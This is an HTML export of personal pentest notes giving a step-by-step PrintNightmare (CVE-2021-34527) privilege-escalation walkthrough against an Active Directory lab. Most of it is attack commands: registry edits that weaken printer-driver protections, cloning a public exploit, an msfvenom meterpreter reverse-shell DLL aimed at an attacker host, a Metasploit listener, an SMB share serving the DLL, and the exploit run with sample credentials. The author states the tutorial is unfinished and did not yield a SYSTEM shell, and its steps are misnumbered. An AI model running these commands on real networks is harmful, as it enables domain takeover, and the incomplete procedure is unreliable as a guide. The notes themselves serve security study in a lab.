<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>PrintNightmare (CVE-2021-34527)</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>PrintNightmare (CVE-2021-34527)</h1><br/><br /><strong><h2>WARNING: TUTORIAL TO BE COMPLETED</h2></strong><br /><strong><span style="color:#ff0000;">Something is not working, i have not got a SYSTEM shell at the end</span></strong><br /><strong>Prerequisites:</strong><br />• Username and password of a non administrative user <br />• PrintSpooler service active and not patched on the Windows machine<br /><br />This is a Privilege Escalation attack to become Domain Admin of the Active Directory<br />A remote code execution vulnerability exists when the <span style="text-decoration:underline;">Windows Print Spooler service</span> improperly performs privileged file operations. An attacker who successfully exploited this vulnerability could run arbitrary code with SYSTEM privileges. An attacker could then install programs; view, change, or delete data; or create new accounts with full user rights.<br /><br /><strong>Exploit RCE</strong><br />•  <a href="https://github.com/cube0x0/CVE-2021-1675">https://github.com/cube0x0/CVE-2021-1675</a><br /><br /><br />0. Setup LAB <br />    On the Domain Controller of the Active Directory<br />   <div class="codebox"><pre>reg add <span style="color:#3ad900;font-weight:400">&quot;HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint&quot;</span> <span style="color:#ff9d00;font-weight:700">/</span>v RestrictDriverInstallationToAdministrators <span style="color:#ff9d00;font-weight:700">/</span>t REG_DWORD <span style="color:#ff9d00;font-weight:700">/</span>d 0 <span style="color:#ff9d00;font-weight:700">/</span>f</pre></div><br />   <div class="codebox"><pre>reg add <span style="color:#3ad900;font-weight:400">&quot;HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint&quot;</span> <span style="color:#ff9d00;font-weight:700">/</span>v NoWarningNoElevationOnInstall <span style="color:#ff9d00;font-weight:700">/</span>t REG_DWORD <span style="color:#ff9d00;font-weight:700">/</span>d 1</pre></div><br />   <div class="codebox"><pre>REG QUERY <span style="color:#3ad900;font-weight:400">&quot;HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint&quot;</span></pre></div> <br />   <a href=""><img src="images/1843-1.png" alt="images/1843-1.png" /></a><br />   <div class="codebox"><pre>reg add “HKEY_LOCAL_MACHINE<span style="color:#ff9d00;font-weight:700">\</span>Software<span style="color:#ff9d00;font-weight:700">\</span>Policies<span style="color:#ff9d00;font-weight:700">\</span>Microsoft<span style="color:#ff9d00;font-weight:700">\</span>Windows NT<span style="color:#ff9d00;font-weight:700">\</span>Printers” <span style="color:#ff9d00;font-weight:700">/</span>v RegisterSpoolerRemoteRpcEndPoint <span style="color:#ff9d00;font-weight:700">/</span>t REG_DWORD <span style="color:#ff9d00;font-weight:700">/</span>d <span style="color:#333333;font-weight:400">1</span></pre></div><br />   <br />1. Check if the environment is vulnerable<br />    To do that we need installed impacket or we can use the version of cube0x0 (author of the exploit) here: <a href="https://github.com/cube0x0/impacket">https://github.com/cube0x0/impacket</a><br />    <div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">locate</span> rpcdump.py<br />rpcdump.py @[IP_address_domain_controller] <span style="color:#ff9d00;font-weight:700">|</span> <span style="color:#ff9d00;font-weight:700">egrep</span> <span style="color:#3ad900;font-weight:400">&#39;MS-RPRN|MS-PAR&#39;</span></pre></div><br />    <a href=""><img src="images/1843-2.png" alt="images/1843-2.png" /></a><br />2. Clone the cube0x0 repository if you already do not have done it yet<br />    <div class="codebox"><pre>git clone https<span style="color:#ff9d00;font-weight:700">://</span>github.com<span style="color:#ff9d00;font-weight:700">/</span>cube0x0<span style="color:#ff9d00;font-weight:700">/</span><span style="color:#00117f;font-weight:400">CVE-2021-1675</span>.git<br /><span style="color:#ff9d00;font-weight:700">cd</span> <span style="color:#00117f;font-weight:400">CVE-2021-1675</span></pre></div><br />4. Generate malicious DLL payload <br />    <div class="codebox"><pre>msfvenom <span style="color:#ff9d00;font-weight:700">-</span>p windows<span style="color:#ff9d00;font-weight:700">/</span>x64<span style="color:#ff9d00;font-weight:700">/</span>meterpreter<span style="color:#ff9d00;font-weight:700">/</span>reverse_tcp LHOST<span style="color:#ff9d00;font-weight:700">=</span>[attackerIP] LPORT<span style="color:#ff9d00;font-weight:700">=</span><span style="color:#333333;font-weight:400">5555</span> <span style="color:#ff9d00;font-weight:700">-</span>f dll &gt; shell.dll</pre></div><br />    <span style="text-decoration:underline;">Note</span>: if we have access to the domain controller like in the lab scenario we can know the OS architeture(32 or 64 bit) with “wmic os get osarchitecture”<br /><br />3. Open a new windows on the Attacker machine and set the listener on the Attacker machine<br />    <div class="codebox"><pre>$ msfconsole<br />msf&gt; use multi<span style="color:#ff9d00;font-weight:700">/</span>handler<br />msf&gt; options<br />msf&gt; <span style="color:#ff9d00;font-weight:700">set</span> payload windows<span style="color:#ff9d00;font-weight:700">/</span>x64<span style="color:#ff9d00;font-weight:700">/</span>meterpreter<span style="color:#ff9d00;font-weight:700">/</span>reverse_tcp<br />msf&gt; <span style="color:#ff9d00;font-weight:700">set</span> lport <span style="color:#333333;font-weight:400">5555</span><br />msf&gt; <span style="color:#ff9d00;font-weight:700">set</span> lhost [attackerIP]<br />msf&gt; run</pre></div><br />4. Set up on the Attacker machine SMB File Sharing of the folder containg the malicious DLL created before with msfvenom<br />    <div class="codebox"><pre>locate smbserver.py<br />smbserver.py share <span style="color:#333333;font-weight:400">&#39;pwd&#39;</span> <span style="color:#ff9d00;font-weight:700">-</span>smb2support</pre></div><br />    <a href=""><img src="images/1843-3.png" alt="images/1843-3.png" /></a><br />6. Run the attack<br />    <div class="codebox"><pre>python3 <span style="color:#00117f;font-weight:400">CVE-2021-1675</span>.py daniele<span style="color:#ff9d00;font-weight:700">/</span>pparker<span style="color:#ff9d00;font-weight:700">:</span>Password1@<span style="color:#333333;font-weight:400">192.168</span>.<span style="color:#333333;font-weight:400">147.196</span> <span style="color:#333333;font-weight:400">&#39;\\192.168.147.139\share\shell.dll&#39;</span></pre></div><br />    <a href=""><img src="images/1843-4.png" alt="images/1843-4.png" /></a><br />    <a href=""><img src="images/1843-5.png" alt="images/1843-5.png" /></a><br /><br /><strong>Mitigation</strong><br />• <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527</a><br /><br /></div>
</body>
</html>
